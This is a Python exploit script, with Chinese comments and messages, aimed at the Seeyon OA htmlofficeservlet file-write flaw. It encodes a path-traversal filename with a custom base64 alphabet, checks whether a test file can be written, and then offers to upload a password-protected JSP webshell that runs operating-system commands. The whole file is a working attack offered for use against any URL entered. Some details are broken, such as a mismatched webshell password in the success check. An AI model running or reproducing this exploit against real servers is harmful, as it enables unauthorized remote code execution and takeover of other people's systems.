import requests
import time

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
}

url = input("your want to test the url:")

post_url = url + "/seeyon/htmlofficeservlet"

firstkey = 'DBSTEP V3.0     0               21              0               htmoffice operate err'


def encode(origin_bytes):
    # 将每一位bytes转换为二进制字符串
    base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    base64_bytes = ['{:0>8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp


def trygetshell():
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shell.jsp')
    data = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
          OPTION=S3WYOSWLBSGr\r
          currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
          CREATEDATE=wUghPB3szB3Xwg66\r
          RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
          originalFileId=wV66\r
          originalCreateDate=wUghPB3szB3Xwg66\r
          FILENAME=""" + file_name + """\r
          needReadFile=yRWZdAS6\r
          originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
          <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("test123456".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""
    requests.post(url=post_url, data=data, headers=headers)
    res = requests.get(url + '/seeyon/shell.jsp?pwd=el38A9485&cmd=cmd+/c+echo+hacking')
    if 'hacking' in res.text:
        print(url + "的webshell路径在" + url + "/seeyon/shell.jsp?pwd=test123456&cmd=cmd+/c+whoami")
    else:
        print("存在但是不能利用")


def poc():
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\test.txt')
    data = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
          OPTION=S3WYOSWLBSGr\r
          currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
          CREATEDATE=wUghPB3szB3Xwg66\r
          RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
          originalFileId=wV66\r
          originalCreateDate=wUghPB3szB3Xwg66\r
          FILENAME=""" + file_name + """\r
          needReadFile=yRWZdAS6\r
          originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
          test!123!123!"""
    requests.post(url=post_url, data=data, headers=headers)
    res = requests.get(url + "/seeyon/test.txt")
    time.sleep(2)
    code = res.status_code
    content = res.text
    if code == 200 and "test!123!123!" in content:
        print("存在可写漏洞")
        print(url + "可直接写webshell，尝试路径为" + url + "/seeyon/test.txt")


res = requests.get(url=post_url, headers=headers)
content = res.text
if firstkey in content:
    poc()
    print("是否接着进行getshell: Yes or No")
    getaction = input("")
    if getaction == "Yes":
        trygetshell()
    elif getaction == "No":
        pass
    else:
        print("只有Yes和No")
else:
    print("no this vuln" % url)
